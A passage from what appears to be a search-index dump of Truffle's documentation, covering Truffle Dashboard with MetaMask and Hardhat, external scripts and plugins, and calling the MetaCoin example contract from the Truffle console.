contracts you need to specify an Ethereum account that has enough funds to cover the transaction fees of the deployment. A popular method of doing this is copy-pasting your mnemonic phrase to a gitignored .env file so that it can be used for, e.g., the @truffle/hdwallet-provider . However, it is generally a bad practice to copy-paste your keys, especially since we have wallets like MetaMask that can send transactions for us. We developed the Truffle Dashboard to provide an easy way to use your existing MetaMask wallet for your deployments and for other transactions that you need to send from a command line context. Because the Truffle Dashboard connects directly to MetaMask it is also possible to use it in combination with hardware wallets like Ledger or Trezor.", "title": "Use Truffle Dashboard"}, {"location": "docs/truffle/how-to/use-the-truffle-dashboard/#starting-a-dashboard", "text": "To start a Truffle Dashboard, you need to run the truffle dashboard command in a separate terminal window. > truffle dashboard [--port <number>] [--host <string>] [--verbose] Truffle Dashboard running at http://localhost:24012 DashboardProvider RPC endpoint running at http://localhost:24012/rpc By default, the command above starts a dashboard at http://localhost:24012 and opens the dashboard in a new tab in your default browser. The Dashboard then prompts you to connect your wallet and confirm that you're connected to the right network. You should double check your connected network at this point, since switching to a different network during a deployment can have unintended consequences. The port and host can be configured through command line options, or by configuring them inside your truffle-config.js . module . exports = { // ... rest of truffle config dashboard : { port : 24012 , } networks : { // ... network configurations, including the network named 'dashboard' } }", "title": "Starting a dashboard"}, {"location": "docs/truffle/how-to/use-the-truffle-dashboard/#connecting-to-the-dashboard", "text": "To make connecting to the Truffle Dashboard easy, Truffle includes a built in network named \"dashboard\". This built in network automatically uses the port and host specified in the dashboard configuration or falls back to the default http://localhost:24012 . This built in network can be used with all your deployments or scripts. truffle migrate --network dashboard truffle console --network dashboard From there, every Ethereum RPC request will be forwarded from Truffle to the Truffle Dashboard, where the user can inspect the RPC requests and process them with MetaMask. Any additional network options or overrides can be provided by adding a network called \"dashboard\" to your truffle-config.js file and providing network options like you would a regular network. module . exports = { // ... rest of truffle config networks : { // ... rest of network config dashboard : { networkCheckTimeout : 120000 , } } dashboard : { // ... dashboard host/port config } };", "title": "Connecting to the dashboard"}, {"location": "docs/truffle/how-to/use-the-truffle-dashboard/#decode-requests", "text": "Truffle Dashboard supports decoding requests for certain RPC calls, allowing you to view a more human-friendly representation of the messaging between your computer and the Ethereum network. Information : The decode functionality is available in Truffle projects for the following methods: eth_sendTransaction , personal_sign , eth_signTypedData_v3 , and eth_signTypedData_v4 . We plan to support non-Truffle tooling such as Hardhat in the future. Each time you run truffle compile , Truffle shares information about your contracts with Truffle Dashboard. Later, when you call a method, Truffle Dashboard consults its repository of this compilation information, and asks @truffle/decoder to translate the request into a human readable format. For example, if you have a contract that allows you to mint 5 tokens and send it to a user ( myaccount.eth in this example), the low-level form would look something like: 0xa0e9439c000000000000000000000000627306090abab3a6e1400e9345bc60c78a8bef570000000000000000000000000000000000000000000000000000000000000005 Truffle Dashboard can display this in a more human-readable format, for example: mint(myaccount.eth, 5)", "title": "Decode requests"}, {"location": "docs/truffle/how-to/use-the-truffle-dashboard/#usage-with-non-truffle-tooling", "text": "To make the Truffle Dashboard accessible to everyone, we developed it to be agnostic about the tools you're using. You can use the Truffle Dashboard with non-Truffle tools such as Hardhat. Information : Truffle Dashboard cannot decode requests when using tools other than Truffle or Hardhat (with the plugin outlined below). We plan to add support for additional tools in the future.", "title": "Usage with non-Truffle tooling"}, {"location": "docs/truffle/how-to/use-the-truffle-dashboard/#using-truffle-dashboard-with-the-hardhat-plugin", "text": "The plugin brings the complete Truffle Dashboard experience, including decoded transaction information, to your Hardhat projects. See the Installation steps to get it setup for your project. The Hardhat plugin extends npx hardhat compile by sending the compiled artifacts to Truffle Dashboard, enabling seamless integration with your existing workflow. When using the Truffle Dashboard with Hardhat, you need to create a network configuration inside your hardhat.config.js file that specifies the Truffle Dashboard's RPC URL. module . exports = { // ... rest of hardhat config networks : { // ... rest of network config 'truffle-dashboard' : { url : \"http://localhost:24012/rpc\" } }, }; From there, it can be used with any Hardhat task or tools like hardhat-deploy . hardhat deploy --network truffle-dashboard", "title": "Using Truffle Dashboard with the Hardhat plugin"}, {"location": "docs/truffle/how-to/write-external-scripts/", "text": "Write external scripts \u00b6 Often you may want to run external scripts that interact with your contracts. Truffle provides an easy way to do this, bootstrapping your contracts based on your desired network and connecting to your Ethereum client automatically per your project configuration . Command \u00b6 To run an external script, perform the following: $ truffle exec <path/to/file.js> Refer to Truffle Commands Reference for more information about this command, such as what options it accepts. File structure \u00b6 In order for external scripts to be run correctly, Truffle expects them to export a function that takes a single parameter as a callback: module . exports = function ( callback ) { // TODO: implement your actions // invoke callback callback (); } You can do anything you'd like within this script, so long as the callback is invoked when the script finishes. The callback accepts an error as its first and only parameter. If an error is provided, execution will halt and the process will return a non-zero exit code. Third-party plugin commands \u00b6 Note : This feature is new and still in a barebones state. Please let us know how we can improve it! Plugin installation / usage \u00b6 Install the plugin from NPM. npm install --save-dev truffle-plugin-hello Add a plugins section to your Truffle config. module . exports = { /* ... rest of truffle-config */ plugins : [ \"truffle-plugin-hello\" ] } Run the command $ truffle run hello Hello, World! Create a custom command plugin \u00b6 Implement the command as a Node module with a function as its default export. Example: hello.js /** * Outputs `Hello, World!` when running `truffle run hello`, * or `Hello, ${name}` when running `truffle run hello [name]` * @param {Config} config - A truffle-config object. * Has attributes like `truffle_directory`, `working_directory`, etc. */ module . exports = async ( config ) => { // config._ has the command arguments. // config_[0] is the command name, e.g. \"hello\" here. // config_[1] starts remaining parameters. if ( config . help ) { console . log ( `Usage: truffle run hello [name]` ); return ; } let name = config . _ . length > 1 ? config . _ [ 1 ] : 'World!' ; console . log ( `Hello, ${ name } ` ); } Define a truffle-plugin.json file to specify the command. Example: truffle-plugin.json { \"commands\" : { \"hello\" : \"hello.js\" } } Publish to NPM npm publish Import Truffle as a module \u00b6 const truffle = require ( \"truffle\" ); Beginning with v5.0.30 , Truffle exports the methods listed in core/index.js . This means your plugin can consume the user's Truffle instance as a library and access a subset of its internal command APIs. These are useful if you need to touch several Truffle commands in succession. For example, imagine a plugin that evaluated how a contract system performed at different levels of solc optimization. Its workflow might look like: for a range of solc settings: compile contracts to a temp folder run user's tests using the temp artifacts measure and save gas usage data aggregate data and report The Truffle library lets you do this without making the user add configuration or string their own commands together. Warning : Truffle does not guarantee its internal APIs will follow semver. You should be prepared for your user to run any Truffle version and handle mismatches gracefully. By using the library you are entering into an agreement to manage API volatility and other contingencies on your users' behalf. Some tips: \u2022 Always require Truffle in a try/catch block \u2022 At runtime, verify the API components you need are actually exposed \u2022 Consume separately published (and semver guaranteed) Truffle modules when possible \u2022 Add yourself to the Truffle repo watch list on GitHub and keep abreast of internal changes that might affect you. \u2022 Do not go on vacation", "title": "Write external scripts"}, {"location": "docs/truffle/how-to/write-external-scripts/#write-external-scripts", "text": "Often you may want to run external scripts that interact with your contracts. Truffle provides an easy way to do this, bootstrapping your contracts based on your desired network and connecting to your Ethereum client automatically per your project configuration .", "title": "Write external scripts"}, {"location": "docs/truffle/how-to/write-external-scripts/#command", "text": "To run an external script, perform the following: $ truffle exec <path/to/file.js> Refer to Truffle Commands Reference for more information about this command, such as what options it accepts.", "title": "Command"}, {"location": "docs/truffle/how-to/write-external-scripts/#file-structure", "text": "In order for external scripts to be run correctly, Truffle expects them to export a function that takes a single parameter as a callback: module . exports = function ( callback ) { // TODO: implement your actions // invoke callback callback (); } You can do anything you'd like within this script, so long as the callback is invoked when the script finishes. The callback accepts an error as its first and only parameter. If an error is provided, execution will halt and the process will return a non-zero exit code.", "title": "File structure"}, {"location": "docs/truffle/how-to/write-external-scripts/#third-party-plugin-commands", "text": "Note : This feature is new and still in a barebones state. Please let us know how we can improve it!", "title": "Third-party plugin commands"}, {"location": "docs/truffle/how-to/write-external-scripts/#plugin-installation-usage", "text": "Install the plugin from NPM. npm install --save-dev truffle-plugin-hello Add a plugins section to your Truffle config. module . exports = { /* ... rest of truffle-config */ plugins : [ \"truffle-plugin-hello\" ] } Run the command $ truffle run hello Hello, World!", "title": "Plugin installation / usage"}, {"location": "docs/truffle/how-to/write-external-scripts/#create-a-custom-command-plugin", "text": "Implement the command as a Node module with a function as its default export. Example: hello.js /** * Outputs `Hello, World!` when running `truffle run hello`, * or `Hello, ${name}` when running `truffle run hello [name]` * @param {Config} config - A truffle-config object. * Has attributes like `truffle_directory`, `working_directory`, etc. */ module . exports = async ( config ) => { // config._ has the command arguments. // config_[0] is the command name, e.g. \"hello\" here. // config_[1] starts remaining parameters. if ( config . help ) { console . log ( `Usage: truffle run hello [name]` ); return ; } let name = config . _ . length > 1 ? config . _ [ 1 ] : 'World!' ; console . log ( `Hello, ${ name } ` ); } Define a truffle-plugin.json file to specify the command. Example: truffle-plugin.json { \"commands\" : { \"hello\" : \"hello.js\" } } Publish to NPM npm publish", "title": "Create a custom command plugin"}, {"location": "docs/truffle/how-to/write-external-scripts/#import-truffle-as-a-module", "text": "const truffle = require ( \"truffle\" ); Beginning with v5.0.30 , Truffle exports the methods listed in core/index.js . This means your plugin can consume the user's Truffle instance as a library and access a subset of its internal command APIs. These are useful if you need to touch several Truffle commands in succession. For example, imagine a plugin that evaluated how a contract system performed at different levels of solc optimization. Its workflow might look like: for a range of solc settings: compile contracts to a temp folder run user's tests using the temp artifacts measure and save gas usage data aggregate data and report The Truffle library lets you do this without making the user add configuration or string their own commands together. Warning : Truffle does not guarantee its internal APIs will follow semver. You should be prepared for your user to run any Truffle version and handle mismatches gracefully. By using the library you are entering into an agreement to manage API volatility and other contingencies on your users' behalf. Some tips: \u2022 Always require Truffle in a try/catch block \u2022 At runtime, verify the API components you need are actually exposed \u2022 Consume separately published (and semver guaranteed) Truffle modules when possible \u2022 Add yourself to the Truffle repo watch list on GitHub and keep abreast of internal changes that might affect you. \u2022 Do not go on vacation", "title": "Import Truffle as a module"}, {"location": "docs/truffle/how-to/contracts/interact-with-your-contracts/", "text": "Interact with your contracts \u00b6 Introduction \u00b6 If you were writing raw requests to the Ethereum network yourself in order to interact with your contracts, you'd soon realize that writing these requests is clunky and cumbersome. As well, you might find that managing the state for each request you've made is complicated . Fortunately, Truffle takes care of this complexity for you, to make interacting with your contracts a breeze. Reading and writing data \u00b6 The Ethereum network makes a distinction between writing data to the network and reading data from it, and this distinction plays a significant part in how you write your application. In general, writing data is called a transaction whereas reading data is called a call . Transactions and calls are treated very differently, and have the following characteristics. Transactions \u00b6 Transactions fundamentally change the state of the network. A transaction can be as simple as sending Ether to another account, or as complicated as executing a contract function or adding a new contract to the network. The defining characteristic of a transaction is that it writes (or changes) data. Transactions cost Ether to run, known as \"gas\", and transactions take time to process. When you execute a contract's function via a transaction, you cannot receive that function's return value because the transaction isn't processed immediately. In general, functions meant to be executed via a transaction will not return a value; they will return a transaction id instead. So in summary, transactions: Cost gas (Ether) Change the state of the network Aren't processed immediately Won't expose a return value (only a transaction id). Calls \u00b6 Calls, on the other hand, are very different. Calls can be used to execute code on the network, though no data will be permanently changed. Calls are free to run, and their defining characteristic is that they read data. When you execute a contract function via a call you will receive the return value immediately. In summary, calls: Are free (do not cost gas) Do not change the state of the network Are processed immediately Will expose a return value (hooray!) Choosing between a transaction and a call is as simple as deciding whether you want to read data, or write it. Introducing abstractions \u00b6 Contract abstractions are the bread and butter of interacting with Ethereum contracts from Javascript. In short, contract abstractions are wrapper code that makes interaction with your contracts easy, in a way that lets you forget about the many engines and gears executing under the hood. Truffle uses its own contract abstraction via the @truffle/contract module, and it is this contract abstraction that's described below. In order to appreciate the usefulness of a contract abstraction, however, we first need a contract to talk about. We'll use the MetaCoin contract available to you through Truffle Boxes via truffle unbox metacoin . pragma solidity >= 0.4.25 < 0.6.0 ; import \"./ConvertLib.sol\" ; // This is just a simple example of a coin-like contract. // It is not standards compatible and cannot be expected to talk to other // coin/token contracts. If you want to create a standards-compliant // token, see: https://github.com/ConsenSys/Tokens. Cheers! contract MetaCoin { mapping ( address => uint ) balances ; event Transfer ( address indexed _from , address indexed _to , uint256 _value ); constructor () public { balances [ tx.origin ] = 10000 ; } function sendCoin ( address receiver , uint amount ) public returns ( bool sufficient ) { if ( balances [ msg.sender ] < amount ) return false ; balances [ msg.sender ] -= amount ; balances [ receiver ] += amount ; emit Transfer ( msg.sender , receiver , amount ); return true ; } function getBalanceInEth ( address addr ) public view returns ( uint ){ return ConvertLib . convert ( getBalance ( addr ), 2 ); } function getBalance ( address addr ) public view returns ( uint ) { return balances [ addr ]; } } This contract has three methods aside from the constructor ( sendCoin , getBalanceInEth , and getBalance ). All three methods can be executed as either a transaction or a call. Now let's look at the Javascript object called MetaCoin provided for us by Truffle, as made available in the Truffle console : truffle ( develop ) > let instance = await MetaCoin . deployed () truffle ( develop ) > instance // outputs: // // Contract // - address: \"0xa9f441a487754e6b27ba044a5a8eb2eec77f6b92\" // - allEvents: () // - getBalance: () // - getBalanceInEth: () // - sendCoin: () // ... Notice that the abstraction contains the exact same functions that exist within our contract. It also contains an address which points to the deployed version of the MetaCoin contract. Executing contract functions \u00b6 Using the abstraction you can easily execute contract functions on the Ethereum network. Making a transaction \u00b6 There are three functions on the MetaCoin contract that we can execute. If you analyze each of them, you'll see that sendCoin is the only function that aims to make changes to the network. The goal of sendCoin is to \"send\" some Meta coins from one account to the next, and these changes should persist. When calling sendCoin , we'll execute it as a transaction. In the following example, we'll send 10 Meta coin from one account to another, in a way that persists changes on the network: truffle ( develop ) > let accounts = await web3 . eth . getAccounts () truffle ( develop ) > instance . sendCoin ( accounts [ 1 ], 10 , { from : accounts [ 0 ]}) There are a few things interesting about the above code: We called the abstraction's sendCoin function directly. This will result in a transaction by default (i.e, writing data) instead of call. We passed an object as the third parameter to sendCoin . Note that the sendCoin function in our Solidity contract doesn't have a third parameter. What you see above is a special object that can always be passed as the last parameter to a function that lets you edit specific details about the transaction (\"transaction params\"). Here, we set the from address ensuring this transaction came from accounts[0] . The transaction params that you can set correspond to the fields in an Ethereum transaction: from to gas gasPrice value data nonce Making a call \u00b6 Continuing with MetaCoin, notice the getBalance function is a great candidate for reading data from the network. It doesn't need to make any changes, as it just returns the MetaCoin balance of the address passed to it. Let's give it a shot: truffle ( develop ) > let balance = await instance . getBalance ( accounts [ 0 ]) truffle ( develop ) > balance . toNumber () What's interesting here: We received a return value. Note that since the Ethereum network can handle very large numbers, we're given a BN object which we then convert to a number. Warning : We convert the return value to a number because in this example the numbers are small. However, if you try to convert a BN that's larger than the largest integer supported by Javascript, you'll likely run into errors or unexpected behavior. Processing transaction results \u00b6 When you make a transaction, you're given a result object that gives you a wealth of information about the transaction. truffle ( develop ) > let result = await instance . sendCoin ( accounts [ 1 ], 10 , { from : accounts [ 0 ]}) truffle ( develop ) > result Specifically, you get the following: result.tx (string) - Transaction hash result.logs (array) - Decoded events (logs) result.receipt (object) - Transaction receipt (includes the amount of gas used) For more information, please see the README in the @truffle/contract package. Catching events \u00b6 Your contracts can fire events that you can catch to gain more insight into what your contracts are doing. The easiest way to handle events is by processing the logs array contained within result object of the transaction that triggered the event. If we explicitly output the first log entry we can see the details of the event that was emitted as part of the sendCoin call ( Transfer(msg.sender, receiver, amount); ). truffle ( develop ) > result . logs [ 0 ] { logIndex : 0 , transactionIndex : 0 , transactionHash : '0x3b33960e99416f687b983d4a6bb628d38bf7855c6249e71d0d16c7930a588cb2' , blockHash : '0xe36787063e114a763469e7dabc7aa57545e67eb2c395a1e6784988ac065fdd59' , blockNumber : 8 , address : '0x6891Ac4E2EF3dA9bc88C96fEDbC9eA4d6D88F768' , type : 'mined' , id : 'log_3181e274' , event : 'Transfer' , args : Result { '0' : '0x8128880DC48cde7e471EF6b99d3877357bb93f01' , '1' : '0x12B6971f6eb35dD138a03Bd6cBdf9Fc9b9a87d7e' , '2' : < BN : a > , __length__ : 3 , _from : '0x8128880DC48cde7e471EF6b99d3877357bb93f01' , _to : '0x12B6971f6eb35dD138a03Bd6cBdf9Fc9b9a87d7e' , _value : < BN : a > } } Add a new contract to the network \u00b6 In all of the above cases, we've been using a contract abstraction that has already been deployed. We can deploy our own version to the network using the .new() function: truffle ( develop ) > let newInstance = await MetaCoin . new () truffle ( develop ) > newInstance . address '0x64307b67314b584b1E3Be606255bd683C835A876' Use a contract at a specific address \u00b6 If you already have an address for a contract, you can create a new abstraction to represent the contract at that address. let specificInstance = await MetaCoin . at ( \"0x1234...\" ); Sending ether to a contract \u00b6 You may simply want to send Ether directly to a contract, or trigger a contract's fallback function . You can do so using one of the following two options. Option 1: Send a transaction directly to a contract via instance.sendTransaction() . This is promisified like all available contract instance functions, and has the same API as web3.eth.sendTransaction but without the callback. The to value will be automatically filled in for you if not specified. instance . sendTransaction ({...}). then ( function ( result ) { // Same transaction result object as above. }); Option 2: There's also shorthand for just sending Ether directly: instance . send ( web3 . utils . toWei ( \"1\" , \"ether\" )). then ( function ( result ) { // Same result object as above. }); Special methods on Truffle contract objects \u00b6 There are a couple of special functions that you can find on the actual contract methods of your contract abstractions: estimateGas sendTransaction call request The first special method mentioned above is the estimateGas method. This, as you probably can guess, estimates the amount of gas that a transaction will require. If we wanted to estimate the gas for a transaction, we would call it on the contract method itself. It would look something like the following: const instance = await MyContract . deployed (); const amountOfGas = await instance . sendTokens . estimateGas ( 4 , myAccount ); This will give us an estimate of how much gas it will take to run the transaction specified. Note that the arguments above ( 4 and myAccount ) correspond to whatever the signature of the contract method happens to be. Another useful thing to note is that you can also call this on a contract's new method to see how much gas it will take to deploy. So you would do Contract.new.estimateGas() to get the gas estimate for the contract's deployment. The next mentioned method is sendTransaction . In general, if you execute a contract method, Truffle will intelligently figure out whether it needs to make a transaction or a call. If your function can be executed as a call, then Truffle will do so and you will be able to avoid gas costs. There may be some scenarios, however, where you want to force Truffle to make a transaction. In these cases, you can use the sendTransaction method found on the method itself. This would look something like instance.myMethod.sendTransaction() . For example, suppose I have a contract instance with the method getTokenBalance . I could do the following to force a transaction to take place while executing getTokenBalance : const instance = await MyContract . deployed (); const result = await instance . getTokenBalance . sendTransaction ( myAccount ); The result variable above will be the same kind of result you would get from executing any normal transaction in Truffle. It will contain the transaction hash, the logs, etc. The next method is call and the syntax is exactly the same as for sendTransaction . If you want to explicitly make a call, you can use the call method found on your contract abstraction's method. So you would write something that looks like const result = await instance.myMethod.call() . The last method is request . This method does not perform a transaction or call, but rather returns an object that can be passed to web3.eth.sendTransaction or web3.eth.call if you want to perform the transaction or call yourself. It has the same syntax as the others, and like with estimateGas , you can also do Contract.new.request() if you want to perform a manual deployment. Invoking overloaded methods \u00b6 The current implementation of Truffle's contract abstraction can mistakenly infer the signature of an overloaded method even though it exists in the contract ABI. Therefore, some methods may not be accessible through the contract's instance, but their accessors can be invoked explicitly via the .methods property of the contract. const instance = await MyContract . deployed (); instance . methods [ 'setValue(uint256)' ]( 123 ); instance . methods [ 'setValue(uint256,uint256)' ]( 11 , 55 ); Please see this issue here for more information. Using enumerations \u00b6 Contract abstractions can also be used to access Solidity enumerations defined within that contract. For instance, suppose we have the following Solidity contract: contract ExampleContract { enum ExampleEnum { ExampleOption0 , ExampleOption1 , ExampleOption2 } // ... } One could then use ExampleContract.ExampleEnum.ExampleOption0 to access that enum value; in this case, that is equal to 0 , but using this allows one to pass in enums to contract methods without having to worry about their numerical value. A contract's enums are also available under .enums , so in this case, one could also write ExampleContract.enums.ExampleEnum.ExampleOption0 . Further reading \u00b6 The contract abstractions provided by Truffle contain a wealth of utilities for making interacting with your contracts easy. Check out the @truffle/contract documentation for tips, tricks and insights.", "title": "Interact with contracts"}, {"location": "docs/truffle/how-to/contracts/interact-with-your-contracts/#interact-with-your-contracts", "text": "", "title": "Interact with your contracts"}, {"location": "docs/truffle/how-to/contracts/interact-with-your-contracts/#introduction", "text": "If you were writing raw requests to the Ethereum network yourself in order to interact with your contracts, you'd soon realize that writing these requests is clunky and cumbersome. As well, you might find that managing the state for each request you've made is complicated . Fortunately, Truffle takes care of this complexity for you, to make interacting with your contracts a breeze.", "title": "Introduction"}, {"location": "docs/truffle/how-to/contracts/interact-with-your-contracts/#reading-and-writing-data", "text": "The Ethereum network makes a distinction between writing data to the network and reading data from it, and this distinction plays a significant part in how you write your application. In general, writing data is called a transaction whereas reading data is called a call . Transactions and calls are treated very differently, and have the following characteristics.", "title": "Reading and writing data"}, {"location": "docs/truffle/how-to/contracts/interact-with-your-contracts/#transactions", "text": "Transactions fundamentally change the state of the network. A transaction can be as simple as sending Ether to another account, or as complicated as executing a contract function or adding a new contract to the network. The defining characteristic of a transaction is that it writes (or changes) data. Transactions cost Ether to run, known as \"gas\", and transactions take time to process. When you execute a contract's function via a transaction, you cannot receive that function's return value because the transaction isn't processed immediately. In general, functions meant to be executed via a transaction will not return a value; they will return a transaction id instead. So in summary, transactions: Cost gas (Ether) Change the state of the network Aren't processed immediately Won't expose a return value (only a transaction id).", "title": "Transactions"}, {"location": "docs/truffle/how-to/contracts/interact-with-your-contracts/#calls", "text": "Calls, on the other hand, are very different. Calls can be used to execute code on the network, though no data will be permanently changed. Calls are free to run, and their defining characteristic is that they read data. When you execute a contract function via a call you will receive the return value immediately. In summary, calls: Are free (do not cost gas) Do not change the state of the network Are processed immediately Will expose a return value (hooray!) Choosing between a transaction and a call is as simple as deciding whether you want to read data, or write it.", "title": "Calls"}, {"location": "docs/truffle/how-to/contracts/interact-with-your-contracts/#introducing-abstractions", "text": "Contract abstractions are the bread and butter of interacting with Ethereum contracts from Javascript. In short, contract abstractions are wrapper code that makes interaction with your contracts easy, in a way that lets you forget about the many engines and gears executing under the hood. Truffle uses its own contract abstraction via the @truffle/contract module, and it is this contract abstraction that's described below. In order to appreciate the usefulness of a contract abstraction, however, we first need a contract to talk about. We'll use the MetaCoin contract available to you through Truffle Boxes via truffle unbox metacoin . pragma solidity >= 0.4.25 < 0.6.0 ; import \"./ConvertLib.sol\" ; // This is just a simple example of a coin-like contract. // It is not standards compatible and cannot be expected to talk to other // coin/token contracts. If you want to create a standards-compliant // token, see: https://github.com/ConsenSys/Tokens. Cheers! contract MetaCoin { mapping ( address => uint ) balances ; event Transfer ( address indexed _from , address indexed _to , uint256 _value ); constructor () public { balances [ tx.origin ] = 10000 ; } function sendCoin ( address receiver , uint amount ) public returns ( bool sufficient ) { if ( balances [ msg.sender ] < amount ) return false ; balances [ msg.sender ] -= amount ; balances [ receiver ] += amount ; emit Transfer ( msg.sender , receiver , amount ); return true ; } function getBalanceInEth ( address addr ) public view returns ( uint ){ return ConvertLib . convert ( getBalance ( addr ), 2 ); } function getBalance ( address addr ) public view returns ( uint ) { return balances [ addr ]; } } This contract has three methods aside from the constructor ( sendCoin , getBalanceInEth , and getBalance ). All three methods can be executed as either a transaction or a call. Now let's look at the Javascript object called MetaCoin provided for us by Truffle, as made available in the Truffle console : truffle ( develop ) > let instance = await MetaCoin . deployed () truffle ( develop ) > instance // outputs: // // Contract // - address: \"0xa9f441a487754e6b27ba044a5a8eb2eec77f6b92\" // - allEvents: () // - getBalance: () // - getBalanceInEth: () // - sendCoin: () // ... Notice that the abstraction contains the exact same functions that exist within our contract. It also contains an address which points to the deployed version of the MetaCoin contract.", "title": "Introducing abstractions"}, {"location": "docs/truffle/how-to/contracts/interact-with-your-contracts/#executing-contract-functions", "text": "Using the abstraction you can easily execute contract functions on the Ethereum network.", "title": "Executing contract functions"}, {"location": "docs/truffle/how-to/contracts/interact-with-your-contracts/#making-a-transaction", "text": "There are three functions on the MetaCoin contract that we can execute. If you analyze each of them, you'll see that sendCoin is the only function that aims to make changes to the network. The goal of sendCoin is to \"send\" some Meta coins from one account to the next, and these changes should persist. When calling sendCoin , we'll execute it as a transaction. In the following example, we'll send 10 Meta coin from one account to another, in a way that persists changes on the network: truffle ( develop ) > let accounts = await web3 . eth . getAccounts () truffle ( develop ) > instance . sendCoin ( accounts [ 1 ], 10 , { from : accounts [ 0 ]}) There are a few things interesting about the above code: We called the abstraction's sendCoin function directly. This will result in a transaction by default (i.e, writing data) instead of call. We passed an object as the third parameter to sendCoin . Note that the sendCoin function in our Solidity contract doesn't have a third parameter. What you see above is a special object that can always be passed as the last parameter to a function that lets you edit specific details about the transaction (\"transaction params\"). Here, we set the from address ensuring this transaction came from accounts[0] . The transaction params that you can set correspond to the fields in an Ethereum transaction: from to gas gasPrice value data nonce", "title": "Making a transaction"}, {"location": "docs/truffle/how-to/contracts/interact-with-your-contracts/#making-a-call", "text": "Continuing with MetaCoin, notice the getBalance function is a great candidate for reading data from the network. It doesn't need to make any changes, as it just returns the MetaCoin balance of the address passed to it. Let's give it a shot: truffle ( develop ) > let balance = await instance . getBalance ( accounts [ 0 ]) truffle ( develop ) > balance . toNumber () What's interesting here: We received a return value. Note that since the Ethereum network can handle very large numbers, we're given a BN object which we then convert to a number. Warning : We convert the return value to a number because in this example the numbers are small. However, if you try to convert a BN that's larger than the largest integer supported by Javascript, you'll likely run into errors or unexpected behavior.", "title": "Making a call"}, {"location": "docs/truffle/how-to/contracts/interact-with-your-contracts/#processing-transaction-results", "text": "When you make a transaction, you're given a result object that gives you a wealth of information about the transaction. truffle ( develop ) > let result = await instance . sendCoin ( accounts [ 1 ], 10 , { from : accounts [ 0 ]}) truffle ( develop ) > result Specifically, you get the following: result.tx (string) - Transaction hash result.logs (array) - Decoded events (logs) result.receipt (object) - Transaction receipt (includes the amount of gas used) For more information, please see the README in the @truffle/contract package.", "title": "Processing transaction results"}, {"location": "docs/truffle/how-to/contracts/interact-with-your-contracts/#catching-events", "text": "Your contracts can fire events that you can catch to gain more insight into what your contracts are doing. The easiest way to handle events is by processing the logs array contained within result object of the transaction that triggered the event. If we explicitly output the first log entry we can see the details of the event that was emitted as part of the sendCoin call ( Transfer(msg.sender, receiver, amount); ). truffle ( develop ) > result . logs [ 0 ] { logIndex : 0 , transactionIndex : 0 , transactionHash : '0x3b33960e99416f687b983d4a6bb628d38bf7855c6249e71d0d16c7930a588cb2' , blockHash : '0xe36787063e114a763469e7dabc7aa57545e67eb2c395a1e6784988ac065fdd59' , blockNumber : 8 , address : '0x6891Ac4E2EF3dA9bc88C96fEDbC9eA4d6D88F768' , type : 'mined' , id : 'log_3181e274' , event : 'Transfer' , args : Result { '0' : '0x8128880DC48cde7e471EF6b99d3877357bb93f01' , '1' : '0x12B6971f6eb35dD138a03Bd6cBdf9Fc9b9a87d7e' , '2' : < BN : a > , __length__ : 3 , _from : '0x8128880DC48cde7e471EF6b99d3877357bb93f01' , _to : '0x12B6971f6eb35dD138a03Bd6cBdf9Fc9b9a87d7e' , _value : < BN : a > } }", "title": "Catching events"}, {"location": "docs/truffle/how-to/contracts/interact-with-your-contracts/#add-a-new-contract-to-the-network", "text": "In all of the above cases, we've been using a contract abstraction that has already been deployed. We can deploy our own version to the network using the .new() function: truffle ( develop ) > let newInstance = await MetaCoin . new () truffle ( develop ) > newInstance . address '0x64307b67314b584b1E3Be606255bd683C835A876'", "title": "Add a new contract to the network"}, {"location": "docs/truffle/how-to/contracts/interact-with-your-contracts/#use-a-contract-at-a-specific-address", "text": "If you already have an address for a contract, you can create a new abstraction to represent the contract at that address. let specificInstance = await MetaCoin . at ( \"0x1234...\" );", "title": "Use a contract at a specific address"}, {"location": "docs/truffle/how-to/contracts/interact-with-your-contracts/#sending-ether-to-a-contract", "text": "You may simply want to send Ether directly to a contract, or trigger a contract's fallback function . You can do so using one of the following two options. Option 1: Send a transaction directly to a contract via instance.sendTransaction() . This is promisified like all available contract instance functions, and has the same API as web3.eth.sendTransaction but without the callback. The to value will be automatically filled in for you if not specified. instance . sendTransaction ({...}). then ( function ( result ) { // Same transaction result object as above. }); Option 2: There's also shorthand for just sending Ether directly: instance . send ( web3 . utils . toWei ( \"1\" , \"ether\" )). then ( function ( result ) { // Same result object as above. });", "title": "Sending ether to a contract"}, {"location": "docs/truffle/how-to/contracts/interact-with-your-contracts/#special-methods-on-truffle-contract-objects", "text": "There are a couple of special functions that you can find on the actual contract methods of your contract abstractions: estimateGas sendTransaction call request The first special method mentioned above is the estimateGas method. This, as you probably can guess, estimates the amount of gas that a transaction will require. If we wanted to estimate the gas for a transaction, we would call it on the contract method itself. It would look something like the following: const instance = await MyContract . deployed (); const amountOfGas = await instance . sendTokens . estimateGas ( 4 , myAccount ); This will give us an estimate of how much gas it will take to run the transaction specified. Note that the arguments above ( 4 and myAccount ) correspond to whatever the signature of the contract method happens to be. Another useful thing to note is that you can also call this on a contract's new method to see how much gas it will take to deploy. So you would do Contract.new.estimateGas() to get the gas estimate for the contract's deployment. The next mentioned method is sendTransaction . In general, if you execute a contract method, Truffle will intelligently figure out whether it needs to make a transaction or a call. If your function can be executed as a call, then Truffle will do so and you will be able to avoid gas costs. There may be some scenarios, however, where you want to force Truffle to make a transaction. In these cases, you can use the sendTransaction method found on the method itself. This would look something like instance.myMethod.sendTransaction() . For example, suppose I have a contract instance with the method getTokenBalance . I could do the following to force a transaction to take place while executing getTokenBalance : const instance = await MyContract . deployed (); const result = await instance . getTokenBalance . sendTransaction ( myAccount ); The result variable above will be the same kind of result you would get from executing any normal transaction in Truffle. It will contain the transaction hash, the logs, etc. The next method is call and the syntax is exactly the same as for sendTransaction . If you want to explicitly make a call, you can use the call method found on your contract abstraction's method. So you would write something that looks like const result = await instance.myMethod.call() . The last method is request . This method does not perform a transaction or call, but rather returns an object that can be passed to web3.eth.sendTransaction or web3.eth.call if you want to perform the transaction or call yourself. It has the same syntax as the others, and like with estimateGas , you can also do Contract.new.request() if you want to perform a manual deployment.", "title": "Special methods on Truffle contract objects"}, {"location": "docs/truffle/how-to/contracts/interact-with-your-contracts/#invoking-overloaded-methods", "text": "The current implementation of Truffle's contract abstraction can mistakenly infer the signature of an overloaded method even though it exists in the contract ABI. Therefore, some methods may not be accessible through the contract's instance, but their accessors can be invoked explicitly via the .methods property of the contract. const instance = await MyContract . deployed (); instance . methods [ 'setValue(uint256)' ]( 123 ); instance . methods [ 'setValue(uint256,uint256)' ]( 11 , 55 